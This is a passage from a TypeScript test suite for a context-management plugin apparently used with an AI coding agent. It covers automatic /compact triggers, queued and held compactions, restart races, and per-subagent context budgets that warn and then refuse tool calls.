test('a dropped restart whose queued /clear lands late flags the band', { plugins: [PEEK_RESTART] }, async ($, on) => {
  const w = restartWorld({ hang: { clear: 60 * MIN } })
  const { clock } = await armed($, on, w)
  await ready($, clock)
  await start($)
  await clock.settle()
  expect((await peekRestart($)).band?.restartFailed ?? null).toBeNull()
  // The old copy's /clear runs after all.
  await $.session.end({ reason: 'clear', sessionId: 's1', resume: {} as never })
  expect((await peekRestart($)).band?.restartFailed).toBe('restart failed — type /ctx-guard:resume role=lead handoff=.ctx-guard/lead-handoff.md')
  expect(w.toasts.some(t => t.includes("the interrupted restart's /clear ran after all"))).toBe(true)
})

// ---- compact: the compact action and restart via compact ---------------------

const KEEP = 'Keep open tasks and file paths.'
const COMPACTED = `compact ${KEEP}`

function compactConfig(restart: Record<string, unknown> = {}) {
  return {
    version: 1,
    roles: {
      lead: {
        triggers: [{ id: 'squeeze', when: { context: '85%' }, do: ['compact'] }],
        restart: { peers: ['reviewer'], peerGap: '10m', ...restart },
        compact: { instructions: KEEP },
      },
      reviewer: {},
    },
  }
}

// A trusted lead whose last Stop reported nothing in flight.
async function compactArmed($: Engine, on: On, w: World, config: unknown = compactConfig()): Promise<{ clock: MockClock; session: MockSession }> {
  const env = await armed($, on, w, config)
  await $.classic.Stop({ stop_hook_active: false, background_tasks: [] })
  return env
}

async function mainTurnEnd($: Engine, clock: MockClock, answer = 'Done.'): Promise<void> {
  await $.classic.Stop({ stop_hook_active: false, background_tasks: [] })
  await $.turn.complete({ answer, durationMs: 1, isAborted: false, turnId: 't1', reason: 'answer' })
  await clock.settle()
}

test('compact action: fires once at the threshold with the role\'s instructions, never clears', async ($, on) => {
  const w = restartWorld()
  const { clock } = await compactArmed($, on, w)
  await measure($, w, 800_000)
  await clock.settle()
  expect(w.ran).toEqual([])
  await measure($, w, 860_000)
  await clock.settle()
  expect(w.ran).toEqual([COMPACTED])
  await measure($, w, 870_000)
  await clock.settle()
  expect(w.ran).toEqual([COMPACTED])
  expect(w.toasts).toContain('ctx-guard: compacting lead (trigger "squeeze")')
  expect(await ctxGuard($, '')).toContain('last compact: ran 0s ago (squeeze): compacted by trigger "squeeze"')
})

test('compact action: no instructions runs a bare /compact', async ($, on) => {
  const w = restartWorld()
  const config = compactConfig()
  delete (config.roles.lead as Record<string, unknown>).compact
  const { clock } = await compactArmed($, on, w, config)
  await measure($, w, 860_000)
  await clock.settle()
  expect(w.ran).toEqual(['compact'])
})

test('compact action: queued while a turn runs, run at its end', async ($, on) => {
  const w = restartWorld()
  const { clock } = await compactArmed($, on, w)
  await $.turn.start({ text: 'go', turnId: 't1' })
  await measure($, w, 860_000)
  await clock.settle()
  expect(w.ran).toEqual([])
  expect(await ctxGuard($, '')).toContain('queued compact: queued for trigger "squeeze" (lead), 0s ago')
  await mainTurnEnd($, clock)
  expect(w.ran).toEqual([COMPACTED])
  expect(await ctxGuard($, '')).not.toContain('queued compact:')
})

test('compact action: busy work keeps it queued with one toast; the next quiet turn end runs it', async ($, on) => {
  const w = restartWorld({ agents: [{ id: 'a1', status: 'running', description: 'scan', type: 'Explore' }] })
  const { clock } = await compactArmed($, on, w)
  await measure($, w, 860_000)
  await clock.settle()
  expect(w.ran).toEqual([])
  const waits = (): string[] => w.toasts.filter(t => t.includes('waits (agents still running: scan)'))
  expect(waits().length).toBe(1)
  await mainTurnEnd($, clock)
  expect(w.ran).toEqual([])
  expect(waits().length).toBe(1)
  expect(await ctxGuard($, '')).toContain('waiting: agents still running: scan')
  w.agents = []
  await $.classic.Stop({ stop_hook_active: false, background_tasks: [{ id: 'b1', type: 'shell', status: 'running', description: 'npm run watch' }] })
  await $.turn.complete({ answer: 'Done.', durationMs: 1, isAborted: false, turnId: 't1', reason: 'answer' })
  await clock.settle()
  expect(w.ran).toEqual([])
  await mainTurnEnd($, clock)
  expect(w.ran).toEqual([COMPACTED])
})

test('compact action: a queued compact whose figures fall back is dropped with a toast', async ($, on) => {
  const w = restartWorld({ agents: [{ id: 'a1', status: 'running', description: 'scan', type: 'Explore' }] })
  const { clock } = await compactArmed($, on, w)
  await measure($, w, 860_000)
  await clock.settle()
  await measure($, w, 500_000)
  expect(w.toasts.some(t => t.includes('the queued /compact for trigger "squeeze" was dropped: trigger "squeeze" re-armed'))).toBe(true)
  w.agents = []
  await mainTurnEnd($, clock)
  expect(w.ran).toEqual([])
  expect(await ctxGuard($, '')).toContain('last compact: dropped')
})

test('compact action: a /clear drops a queued compact', async ($, on) => {
  const w = restartWorld()
  const { clock } = await compactArmed($, on, w)
  await $.turn.start({ text: 'go', turnId: 't1' })
  await measure($, w, 860_000)
  await $.session.end({ reason: 'clear', sessionId: 's1', resume: {} as never })
  await mainTurnEnd($, clock)
  expect(w.ran).toEqual([])
  expect(await ctxGuard($, '')).toContain('last compact: dropped 0s ago (squeeze): a /clear came first')
})

test('compact action: untrusted, it is skipped with one toast and a report line', async ($, on) => {
  const w = restartWorld()
  writeConfig(w, compactConfig())
  const { clock } = world(on, w, { CTX_GUARD_ROLE: 'lead' })
  await start($)
  await measure($, w, 860_000)
  await clock.settle()
  await measure($, w, 500_000)
  await measure($, w, 860_000)
  await clock.settle()
  expect(w.ran).toEqual([])
  expect(w.toasts.filter(t => t.includes('/compact for trigger "squeeze" skipped')).length).toBe(1)
  expect(w.toasts.find(t => t.includes('skipped'))).toContain("this repo's compact settings are not approved (never approved)")
  expect(await ctxGuard($, '')).toContain('last compact: skipped 0s ago (squeeze)')
})

test('compact action: autoActions off skips it', { options: { autoActions: false } }, async ($, on) => {
  const w = restartWorld()
  const { clock } = await compactArmed($, on, w)
  await measure($, w, 860_000)
  await clock.settle()
  expect(w.ran).toEqual([])
  expect(w.toasts.some(t => t.includes('skipped: autoActions is off in /config'))).toBe(true)
})

test('compact action: a pause skips it', async ($, on) => {
  const w = restartWorld()
  const { clock } = await compactArmed($, on, w)
  await ctxGuard($, 'pause 10m')
  await measure($, w, 860_000)
  await clock.settle()
  expect(w.ran).toEqual([])
  expect(w.toasts.some(t => t.includes('skipped: ctx-guard is paused'))).toBe(true)
})

test('compact action: a pause that starts while it is queued skips it at the turn end', async ($, on) => {
  const w = restartWorld()
  const { clock } = await compactArmed($, on, w)
  await $.turn.start({ text: 'go', turnId: 't1' })
  await measure($, w, 860_000)
  await ctxGuard($, 'pause 10m')
  await mainTurnEnd($, clock)
  expect(w.ran).toEqual([])
  expect(await ctxGuard($, '')).toContain('last compact: skipped')
})

test('compact action: a queued compact survives a reload and runs at the next turn end', async ($, on) => {
  const w = restartWorld()
  const { clock } = await compactArmed($, on, w)
  await $.turn.start({ text: 'go', turnId: 't1' })
  await measure($, w, 860_000)
  await start($)
  await clock.settle()
  expect(w.ran).toEqual([])
  expect(await ctxGuard($, '')).toContain('queued compact: queued for trigger "squeeze"')
  await mainTurnEnd($, clock)
  expect(w.ran).toEqual([COMPACTED])
})

test('compact action: queued while idle across a reload, the session start runs it', async ($, on) => {
  const w = restartWorld({ agents: [{ id: 'a1', status: 'running', description: 'scan', type: 'Explore' }] })
  const { clock } = await compactArmed($, on, w)
  await measure($, w, 860_000)
  await clock.settle()
  w.agents = []
  await start($)
  await clock.settle()
  expect(w.ran).toEqual([COMPACTED])
})

test('compact action: a reload while /compact runs never sends it twice', async ($, on) => {
  const w = restartWorld({ hang: { compact: 60_000 } })
  const { clock } = await compactArmed($, on, w)
  await measure($, w, 860_000)
  await clock.settle()
  expect(w.ran).toEqual([COMPACTED])
  await start($)
  await mainTurnEnd($, clock)
  await clock.advance(60_000)
  await mainTurnEnd($, clock)
  expect(w.ran).toEqual([COMPACTED])
  // The old copy's compact still counts as the last that ran.
  expect(await ctxGuard($, '')).toContain('last compact: ran')
})

test('compact action: right after one ran, a new edge is held; a fresh reading below drops it', async ($, on) => {
  const w = restartWorld()
  const { clock } = await compactArmed($, on, w)
  await measure($, w, 860_000)
  await clock.settle()
  expect(w.ran).toEqual([COMPACTED])
  // A fresh reading below the threshold re-arms; a stale one past it right after is held, not run.
  await measure($, w, 200_000)
  await measure($, w, 860_000)
  await clock.settle()
  expect(w.ran).toEqual([COMPACTED])
  const report = await ctxGuard($, '')
  expect(report).toContain('last compact: held 0s ago (squeeze)')
  expect(report).toContain('queued compact: queued for trigger "squeeze" (lead), 0s ago; waiting: held until 5m after the last compact')
  await measure($, w, 200_000)
  await clock.advance(6 * MIN)
  expect(w.ran).toEqual([COMPACTED])
})

test('compact action: a held compact runs once the quiet period ends, across a reload too', async ($, on) => {
  const w = restartWorld()
  const { clock } = await compactArmed($, on, w)
  await measure($, w, 860_000)
  await clock.settle()
  await measure($, w, 200_000)
  await clock.advance(MIN)
  await measure($, w, 860_000)
  await clock.settle()
  expect(w.ran).toEqual([COMPACTED])
  await start($)
  await clock.settle()
  await clock.advance(3 * MIN)
  expect(w.ran).toEqual([COMPACTED])
  await clock.advance(MIN + 1000)
  expect(w.ran).toEqual([COMPACTED, COMPACTED])
})

test('compact action: when the hold ends, the engine\'s own figures decide; a stale edge is dropped and re-armed', async ($, on) => {
  const w = restartWorld()
  const { clock } = await compactArmed($, on, w)
  await measure($, w, 860_000)
  await clock.settle()
  await measure($, w, 200_000)
  await measure($, w, 860_000)
  // No reading since: the engine knows nothing yet, so nothing runs.
  w.tokens = undefined
  await clock.advance(6 * MIN)
  expect(w.ran).toEqual([COMPACTED])
  expect(w.toasts.some(t => t.includes('dropped: no reading since the last compact'))).toBe(true)
  // The mark re-armed: a real crossing fires again.
  await measure($, w, 860_000)
  await clock.settle()
  expect(w.ran).toEqual([COMPACTED, COMPACTED])
})

test('compact action: a held edge whose context is below the threshold by the hold\'s end is dropped', async ($, on) => {
  const w = restartWorld()
  const { clock } = await compactArmed($, on, w)
  await measure($, w, 860_000)
  await clock.settle()
  await measure($, w, 200_000)
  await measure($, w, 860_000)
  w.tokens = 300_000
  await clock.advance(6 * MIN)
  expect(w.ran).toEqual([COMPACTED])
  expect(w.toasts.some(t => t.includes('dropped: the context since the last compact is below the threshold'))).toBe(true)
})

test('compact action: a hold timer is set again when ctx-guard is turned off and on', async ($, on) => {
  const w = restartWorld()
  const { clock } = await compactArmed($, on, w)
  await measure($, w, 860_000)
  await clock.settle()
  await measure($, w, 200_000)
  await measure($, w, 860_000)
  await clock.advance(MIN)
  writeConfig(w, { ...compactConfig(), enabled: false })
  await measure($, w, 860_000)
  await clock.advance(MIN)
  writeConfig(w, compactConfig())
  await measure($, w, 860_000)
  await clock.settle()
  await clock.advance(4 * MIN)
  expect(w.ran).toEqual([COMPACTED, COMPACTED])
})

test('via compact: a failed /compact does not retry the queued compact at once', async ($, on) => {
  const w = restartWorld({ failCommand: 'compact' })
  const { clock, session } = await compactArmed($, on, w, compactConfig({ mode: 'auto', via: 'compact' }))
  await $.turn.start({ text: 'go', turnId: 't1' })
  await measure($, w, 860_000)
  await ready($, clock)
  await clock.settle()
  expect(refusals(session)[0]).toContain('/compact was refused')
  expect(w.ran).toEqual([COMPACTED])
  expect(await ctxGuard($, '')).toContain('queued compact: queued for trigger "squeeze"')
})

test('compact action: a refused ready token at the same turn end lets the queued compact run', async ($, on) => {
  const w = restartWorld()
  const { clock, session } = await compactArmed($, on, w, compactConfig({ mode: 'auto', prompt: 'Carry on.' }))
  delete w.files[HANDOFF]
  await $.turn.start({ text: 'go', turnId: 't1' })
  await measure($, w, 860_000)
  await ready($, clock)
  expect(refusals(session)[0]).toContain('(no-handoff)')
  expect(w.ran).toEqual([COMPACTED])
})

test('compact action: skipped while untrusted, it runs once the operator approves the repo', async ($, on) => {
  const w = restartWorld()
  writeConfig(w, compactConfig())
  const { clock } = world(on, w, { CTX_GUARD_ROLE: 'lead' })
  await start($)
  await $.classic.Stop({ stop_hook_active: false, background_tasks: [] })
  await measure($, w, 860_000)
  await clock.settle()
  expect(w.ran).toEqual([])
  expect(await ctxGuard($, '')).toContain('queued compact: blocked for trigger "squeeze"')
  await ctxGuard($, 'trust')
  await clock.settle()
  expect(w.ran).toEqual([COMPACTED])
})

test('compact action: skipped while paused, it runs when the pause is lifted', async ($, on) => {
  const w = restartWorld()
  const { clock } = await compactArmed($, on, w)
  await ctxGuard($, 'pause 10m')
  await measure($, w, 860_000)
  await clock.settle()
  expect(w.ran).toEqual([])
  await ctxGuard($, 'pause off')
  await clock.settle()
  expect(w.ran).toEqual([COMPACTED])
})

test('compact action: skipped while paused, it runs once the pause runs out', async ($, on) => {
  const w = restartWorld()
  const { clock } = await compactArmed($, on, w)
  await ctxGuard($, 'pause 10m')
  await measure($, w, 860_000)
  await clock.settle()
  await clock.advance(9 * MIN)
  expect(w.ran).toEqual([])
  await clock.advance(2 * MIN)
  await clock.settle()
  expect(w.ran).toEqual([COMPACTED])
})

test('compact action: a blocked compact whose figures fall back is dropped, not run after approval', async ($, on) => {
  const w = restartWorld()
  writeConfig(w, compactConfig())
  const { clock } = world(on, w, { CTX_GUARD_ROLE: 'lead' })
  await start($)
  await $.classic.Stop({ stop_hook_active: false, background_tasks: [] })
  await measure($, w, 860_000)
  await measure($, w, 500_000)
  await ctxGuard($, 'trust')
  await clock.settle()
  expect(w.ran).toEqual([])
})

test('race: a compact and a ready-token restart in the same tick never both run (compact first)', async ($, on) => {
  const w = restartWorld({ hang: { compact: 30_000 } })
  const { clock, session } = await compactArmed($, on, w, compactConfig({ mode: 'auto', prompt: 'Carry on.' }))
  await measure($, w, 860_000)
  await ready($, clock)
  expect(refusals(session)[0]).toContain('(already-busy): a /compact of this session is under way')
  await clock.advance(30_000)
  expect(w.ran).toEqual([COMPACTED])
})

test('race: a compact and a ready-token restart in the same tick never both run (restart first)', async ($, on) => {
  const w = restartWorld()
  const { clock } = await compactArmed($, on, w, compactConfig({ mode: 'auto', prompt: 'Carry on.' }))
  await $.classic.Stop({ stop_hook_active: false, background_tasks: [] })
  await $.turn.complete({ answer: 'Done.\n\nCTX-READY', durationMs: 1, isAborted: false, turnId: 't1', reason: 'answer' })
  await measure($, w, 860_000)
  await clock.settle()
  await clock.advance(RACE_SETTLE_MS)
  await clock.settle()
  expect(w.ran).toEqual(['clear', RESUME])
})

test('compact action: a failed /compact toasts and is reported', async ($, on) => {
  const w = restartWorld({ failCommand: 'compact' })
  const { clock } = await compactArmed($, on, w)
  await measure($, w, 860_000)
  await clock.settle()
  expect(w.toasts.some(t => t.includes('/compact for trigger "squeeze" did not run:'))).toBe(true)
  expect(await ctxGuard($, '')).toContain('last compact: failed')
})

test('compact action: a ready-token restart at the same turn end goes first', async ($, on) => {
  const w = restartWorld()
  const config = compactConfig({ mode: 'auto', prompt: 'Carry on.' })
  const { clock } = await compactArmed($, on, w, config)
  await $.turn.start({ text: 'go', turnId: 't1' })
  await measure($, w, 860_000)
  await ready($, clock)
  expect(w.ran).toEqual(['clear', RESUME])
})

test('via compact: runs /compact with the instructions, no clear or resume; handoff, peer and lease are not checked', async ($, on) => {
  const w = restartWorld()
  const { clock, session } = await armed($, on, w, compactConfig({ mode: 'auto', via: 'compact' }))
  delete w.files[HANDOFF]
  w.files[`${STATE}/reviewer.restart`] = { text: JSON.stringify({ owner: 'other', at: clock.now() }), mtimeMs: clock.now() }
  w.files[`${STATE}/lead.owner`] = { text: JSON.stringify({ sessionId: 'other', heartbeat: clock.now() }), mtimeMs: clock.now() }
  await ready($, clock)
  expect(refusals(session)).toEqual([])
  expect(w.ran).toEqual([COMPACTED])
  expect(w.files[`${STATE}/lead.restart`]).toBeUndefined()
  const report = await ctxGuard($, '')
  expect(report).toContain('last verdict: ok')
  expect(report).toContain('(ready token): compacted on the ready token')
})

test('via compact: already-busy while the compact runs; the refusal says nothing was compacted', async ($, on) => {
  const w = restartWorld({ hang: { compact: 30_000 } })
  const { clock, session } = await armed($, on, w, compactConfig({ mode: 'auto', via: 'compact' }))
  await ready($, clock)
  await ready($, clock)
  expect(refusals(session).length).toBe(1)
  expect(refusals(session)[0]).toContain('CTX-READY ignored (already-busy): a /compact of this session is under way. Nothing was compacted.')
  await clock.advance(30_000)
  expect(w.ran).toEqual([COMPACTED])
})

test('via compact: a compact action in flight makes the ready token already-busy', async ($, on) => {
  const w = restartWorld({ hang: { compact: 30_000 } })
  const { clock, session } = await compactArmed($, on, w, compactConfig({ mode: 'auto', via: 'compact' }))
  await measure($, w, 860_000)
  await clock.settle()
  await ready($, clock)
  expect(refusals(session)[0]).toContain('(already-busy)')
  await clock.advance(30_000)
  expect(w.ran).toEqual([COMPACTED])
})

test('via compact: refused while an agent runs or untrusted, and a refused /compact is an error', async ($, on) => {
  const w = restartWorld({ agents: [{ id: 'a1', status: 'running', description: 'scan', type: 'Explore' }] })
  const { clock, session } = await armed($, on, w, compactConfig({ mode: 'auto', via: 'compact' }))
  await ready($, clock)
  expect(refusals(session)[0]).toContain('(agents-running)')
  w.agents = []
  w.failCommand = 'compact'
  await ready($, clock)
  expect(refusals(session)[1]).toMatch(/\(error\): \/compact was refused: .*\. Nothing was compacted\./)
  expect(w.ran).toEqual([COMPACTED])
})

test('via compact: untrusted refuses', async ($, on) => {
  const w = restartWorld()
  writeConfig(w, compactConfig({ mode: 'auto', via: 'compact' }))
  const { clock, session } = world(on, w, { CTX_GUARD_ROLE: 'lead' })
  await start($)
  await ready($, clock)
  expect(refusals(session)[0]).toContain('(untrusted)')
  expect(w.ran).toEqual([])
})

test('via compact: a compact the trigger queued is served by the ready token\'s', async ($, on) => {
  const w = restartWorld()
  const { clock } = await compactArmed($, on, w, compactConfig({ mode: 'auto', via: 'compact' }))
  await $.turn.start({ text: 'go', turnId: 't1' })
  await measure($, w, 860_000)
  await ready($, clock)
  await mainTurnEnd($, clock)
  expect(w.ran).toEqual([COMPACTED])
})

test('/ctx-guard check via compact skips the handoff, lease and peer checks', async ($, on) => {
  const w = restartWorld()
  const { clock } = await armed($, on, w, compactConfig({ mode: 'auto', via: 'compact' }))
  delete w.files[HANDOFF]
  await $.classic.Stop({ stop_hook_active: false, background_tasks: [] })
  const out = await ctxGuard($, 'check')
  expect(out).toContain('ctx-guard check (dry run, role lead, via compact; nothing written or cleared):')
  expect(out).toContain('ok   no-restart-command: /compact found')
  expect(out).toContain('--   no-handoff: not used by via compact')
  expect(out).toContain('--   role-shared: not used by via compact')
  expect(out).toContain('--   peer-restarting: not used by via compact')
  expect(out).toContain('verdict: would restart')
  await clock.settle()
  expect(w.ran).toEqual([])
})

test('via compact: a reload while it runs never sends a second /compact for the queued trigger', async ($, on) => {
  const w = restartWorld({ hang: { compact: 60_000 } })
  const { clock } = await compactArmed($, on, w, compactConfig({ mode: 'auto', via: 'compact' }))
  await $.turn.start({ text: 'go', turnId: 't1' })
  await measure($, w, 860_000)
  await ready($, clock)
  expect(w.ran).toEqual([COMPACTED])
  await start($)
  await mainTurnEnd($, clock)
  await clock.advance(60_000)
  await mainTurnEnd($, clock)
  expect(w.ran).toEqual([COMPACTED])
  expect(await ctxGuard($, '')).toContain('last compact: ran')
})

// ---- subagent budgets -----------------------------------------------------------

const BUDGETS = {
  version: 1,
  roles: { lead: {} },
  subagents: {
    '*': { warn: '120k', stop: '170k' },
    Explore: { stop: '150k', message: 'Budget {stop} reached: return your findings now.' },
    Plan: { warn: 'off' },
  },
}

// Each loop's step answers its own fill: by agent id, main under ''.
function fillBottom(on: On, fills: Record<string, number>): void {
  on('turn.step', async function* ($, e) {
    const t = fills[e.agentId ?? ''] ?? 100_000
    return {
      turnId: e.turnId,
      index: e.index,
      answer: '',
      toolUses: [],
      stopReason: 'end_turn' as never,
      usage: { input_tokens: 1_000, cache_read_input_tokens: t - 3_000, cache_creation_input_tokens: 2_000, output_tokens: 50, model: 'm' },
    }
  })
}

const agentNotes = (s: MockSession, agentId?: string): string[] =>
  s
    .appended()
    .filter(r => r.door === 'note' && r.agentId === agentId)
    .map(r => JSON.stringify(r.message.content))

async function bashBy($: Engine, agentId?: string): Promise<string | undefined> {
  const r = await $.tool.call({ tool: 'Bash', command: 'true', ...(agentId ? { agentId } : {}) } as never)
  return r.deny
}

const subDone = ($: Engine, agentId: string) =>
  $.turn.complete({ answer: 'report', durationMs: 1, isAborted: false, turnId: 't2', reason: 'answer', agentId })

const PEEK_SUB: Plugin = {
  name: 'peek-sub',
  register: on => {
    on('command.run', { command: 'peek-sub' }, async $ => {
      const subagents = (await $.state.get({ plugin: 'ctx-guard', key: 'subagents' })).value ?? null
      const band = (await $.state.get({ plugin: 'ctx-guard', key: 'band' })).value ?? null
      return { text: JSON.stringify({ subagents, over: band?.subagentsOver ?? null }) }
    })
  },
}

async function peekSub($: Engine): Promise<{ subagents: Record<string, { step: string; tokens: number }> | null; over: number | null }> {
  const r = await $.command.run({ command: 'peek-sub', args: '', origin: { kind: 'composer' } as never, presentation: { isFullscreen: false, columns: 120 } })
  return JSON.parse(r.text ?? 'null')
}

const runningAgent = (id: string, type: string) => ({ id, status: 'running', description: 'probe', type })

// An Agent call starting `id` as the engine raises it.
async function spawn($: Engine, id: string, subagentType: string, how: { fork?: boolean; isTeammate?: true } = {}): Promise<void> {
  await $.agent.spawn({
    tool_use_id: 'tu',
    prompt: 'go',
    description: id,
    subagentType,
    provider: { plugin: 'engine', tier: 'core' } as never,
    parentModel: 'm',
    background: false,
    fork: how.fork ?? false,
    ...(how.isTeammate ? { isTeammate: true as const } : {}),
  })
}

test('a subagent fill is input + cache read + cache creation; the warn goes once, to that agent', async ($, on) => {
  const fills: Record<string, number> = { 'sub-1': 110_000 }
  fillBottom(on, fills)
  const w = newWorld()
  writeConfig(w, BUDGETS)
  const { session, clock } = world(on, w, { CTX_GUARD_ROLE: 'lead' })
  await start($)
  await spawn($, 'sub-1', 'general-purpose')
  await step($, clock, 'sub-1')
  expect(agentNotes(session, 'sub-1')).toEqual([])
  fills['sub-1'] = 125_000
  await step($, clock, 'sub-1')
  await step($, clock, 'sub-1')
  const sent = agentNotes(session, 'sub-1')
  expect(sent.length).toBe(1)
  expect(sent[0]).toContain("Your context is at 125k, past this subagent's 120k budget. At 170k your tool calls are refused.")
  expect(agentNotes(session)).toEqual([])
  // Warned, not stopped: its calls still run.
  expect(await bashBy($, 'sub-1')).toBeUndefined()
  // Its spawn named it: no list lookup.
  expect(w.agentListCalls).toBe(0)
})

test('the stop goes once, then that agent alone is refused', async ($, on) => {
  const fills: Record<string, number> = { 'sub-1': 175_000, 'sub-2': 50_000 }
  fillBottom(on, fills)
  const w = newWorld({ agents: [runningAgent('sub-1', 'general-purpose'), runningAgent('sub-2', 'general-purpose')] })
  writeConfig(w, BUDGETS)
  const { session, clock } = world(on, w, { CTX_GUARD_ROLE: 'lead' })
  await start($)
  await step($, clock, 'sub-1')
  await step($, clock, 'sub-2')
  fills['sub-1'] = 180_000
  await step($, clock, 'sub-1')
  // Past both at once: only the stop, in the built-in words.
  expect(agentNotes(session, 'sub-1')).toEqual([JSON.stringify([{ type: 'text', text: '[ctx-guard] context budget 170k reached; return your final report now.' }])])
  expect(await bashBy($, 'sub-1')).toBe('[ctx-guard] context budget 170k reached; return your final report now.')
  expect(await bashBy($, 'sub-2')).toBeUndefined()
  expect(await bashBy($)).toBeUndefined()
  expect(agentNotes(session, 'sub-2')).toEqual([])
})

test('blocking off or a pause: the stop note goes, no call is refused', { options: { blocking: false } }, async ($, on) => {
  fillBottom(on, { 'sub-1': 175_000 })
  const w = newWorld({ agents: [runningAgent('sub-1', 'general-purpose')] })
  writeConfig(w, BUDGETS)
  const { session, clock } = world(on, w, { CTX_GUARD_ROLE: 'lead' })
  await start($)
  await step($, clock, 'sub-1')
  expect(agentNotes(session, 'sub-1').length).toBe(1)
  expect(await bashBy($, 'sub-1')).toBeUndefined()
  expect(await ctxGuard($, '')).toContain('stopped (tool calls allowed: blocking is off in /config)')
})

test('a pause suspends the stop deny until it is lifted', async ($, on) => {
  fillBottom(on, { 'sub-1': 175_000 })
  const w = newWorld({ agents: [runningAgent('sub-1', 'general-purpose')] })
  writeConfig(w, BUDGETS)
  const { session, clock } = world(on, w, { CTX_GUARD_ROLE: 'lead' })
  await start($)
  await ctxGuard($, 'pause 10m')
  await step($, clock, 'sub-1')
  expect(agentNotes(session, 'sub-1').length).toBe(1)
  expect(await bashBy($, 'sub-1')).toBeUndefined()
  await ctxGuard($, 'pause off')
  expect(await bashBy($, 'sub-1')).toContain('context budget 170k reached')
})

test('a type entry merges over "*": its own stop and message, the "*" warn; "off" drops a step', async ($, on) => {
  const fills: Record<string, number> = { ex: 125_000, plan: 160_000 }
  fillBottom(on, fills)
  const w = newWorld({ agents: [runningAgent('ex', 'Explore'), runningAgent('plan', 'Plan')] })
  writeConfig(w, BUDGETS)
  const { session, clock } = world(on, w, { CTX_GUARD_ROLE: 'lead' })
  await start($)
  await step($, clock, 'ex')
  expect(agentNotes(session, 'ex')[0]).toContain("past this subagent's 120k budget. At 150k")
  fills.ex = 151_000
  await step($, clock, 'ex')
  expect(agentNotes(session, 'ex')[1]).toContain('[ctx-guard] Budget 150k reached: return your findings now.')
  expect(await bashBy($, 'ex')).toBe('[ctx-guard] context budget 150k reached; return your final report now.')
  // Plan has no warn: nothing at 160k, the "*" stop at 170k.
  await step($, clock, 'plan')
  expect(agentNotes(session, 'plan')).toEqual([])
  fills.plan = 171_000
  await step($, clock, 'plan')
  expect(agentNotes(session, 'plan')).toEqual([JSON.stringify([{ type: 'text', text: '[ctx-guard] context budget 170k reached; return your final report now.' }])])
})

test('engine forks, Agent forks and teammates get no budget unless an entry names them', async ($, on) => {
  const fills: Record<string, number> = { compact: 500_000, fk: 500_000, mate: 500_000, wf: 125_000 }
  fillBottom(on, fills)
  // A teammate the list names after a reload lost its spawn.
  const w = newWorld({ agents: [{ ...runningAgent('mate-2', 'teammate'), teammateId: 'mate-2@team' } as never] })
  writeConfig(w, BUDGETS)
  const { session, clock } = world(on, w, { CTX_GUARD_ROLE: 'lead' })
  await start($)
  await spawn($, 'fk', 'fork', { fork: true })
  await spawn($, 'mate', 'reviewer', { isTeammate: true })
  // A workflow's agent is raised by agent.spawn too, and named there.
  await spawn($, 'wf', 'Explore')
  fills['mate-2'] = 500_000
  for (const id of ['compact', 'fk', 'mate', 'mate-2', 'wf']) await step($, clock, id)
  for (const id of ['compact', 'fk', 'mate', 'mate-2']) {
    expect(agentNotes(session, id)).toEqual([])
    expect(await bashBy($, id)).toBeUndefined()
  }
  expect(agentNotes(session, 'wf')[0]).toContain("past this subagent's 120k budget. At 150k")
  // Only budgeted agents make the table.
  expect(await ctxGuard($, '')).toMatch(/subagents:\n {2}id +type.*\n {2}wf +Explore +125k +120k +150k +warned$/)
})

test('a "teammate" or "fork" entry budgets them', async ($, on) => {
  fillBottom(on, { fk: 310_000, mate: 410_000 })
  const w = newWorld()
  writeConfig(w, { ...BUDGETS, subagents: { ...BUDGETS.subagents, fork: { stop: '300k' }, teammate: { warn: 'off', stop: '400k' } } })
  const { session, clock } = world(on, w, { CTX_GUARD_ROLE: 'lead' })
  await start($)
  await spawn($, 'fk', 'fork', { fork: true })
  await spawn($, 'mate', 'reviewer', { isTeammate: true })
  await step($, clock, 'fk')
  await step($, clock, 'mate')
  expect(agentNotes(session, 'fk')).toEqual([JSON.stringify([{ type: 'text', text: '[ctx-guard] context budget 300k reached; return your final report now.' }])])
  expect(await bashBy($, 'mate')).toBe('[ctx-guard] context budget 400k reached; return your final report now.')
})

test('a list that throws: no budget yet, asked again once the fill reaches the lowest step of any type', async ($, on) => {
  const fills: Record<string, number> = { 'sub-1': 15_000 }
  fillBottom(on, fills)
  const w = newWorld({ failAgentList: true, agents: [runningAgent('sub-1', 'Explore')] })
  writeConfig(w, { ...BUDGETS, subagents: { '*': { warn: '120k', stop: '170k' }, Explore: { warn: '10k', stop: '20k' } } })
  const { session, clock } = world(on, w, { CTX_GUARD_ROLE: 'lead' })
  await start($)
  await step($, clock, 'sub-1')
  expect(agentNotes(session, 'sub-1')).toEqual([])
  expect(w.agentListCalls).toBe(1)
  w.failAgentList = false
  // Below the lowest step (10k): not asked.
  fills['sub-1'] = 9_000
  await step($, clock, 'sub-1')
  expect(w.agentListCalls).toBe(1)
  fills['sub-1'] = 21_000
  await step($, clock, 'sub-1')
  expect(w.agentListCalls).toBe(2)
  expect(agentNotes(session, 'sub-1')).toEqual([JSON.stringify([{ type: 'text', text: '[ctx-guard] context budget 20k reached; return your final report now.' }])])
  expect(await ctxGuard($, '')).toMatch(/sub-1 +Explore +21k +10k +20k +stopped \(tool calls refused\)/)
})

test('a config reload while an evaluation is under way still re-judges the next step', async ($, on) => {
  fillBottom(on, { 'sub-1': 50_000 })
  const w = newWorld({ agents: [runningAgent('sub-1', 'general-purpose')], listHang: 1_000 })
  writeConfig(w, BUDGETS)
  const { session, clock } = world(on, w, { CTX_GUARD_ROLE: 'lead' })
  await start($)
  // The evaluation waits on the list, judging under the old budgets.
  await step($, clock, 'sub-1')
  writeConfig(w, { ...BUDGETS, subagents: { '*': { warn: '40k', stop: '170k' } } })
  const reload = ctxGuard($, 'reload')
  await clock.settle()
  await clock.advance(1_000)
  await reload
  expect(agentNotes(session, 'sub-1')).toEqual([])
  await step($, clock, 'sub-1')
  expect(agentNotes(session, 'sub-1')[0]).toContain("past this subagent's 40k budget")
})

test("an agent's turn.complete prunes it: the deny lifts and the band count drops", { plugins: [PEEK_SUB] }, async ($, on) => {
  fillBottom(on, { 'sub-1': 175_000, 'sub-2': 130_000 })
  const w = newWorld({ agents: [runningAgent('sub-1', 'general-purpose'), runningAgent('sub-2', 'general-purpose')] })
  writeConfig(w, BUDGETS)
  const { clock } = world(on, w, { CTX_GUARD_ROLE: 'lead' })
  await start($)
  await step($, clock, 'sub-1')
  await step($, clock, 'sub-2')
  expect((await peekSub($)).over).toBe(2)
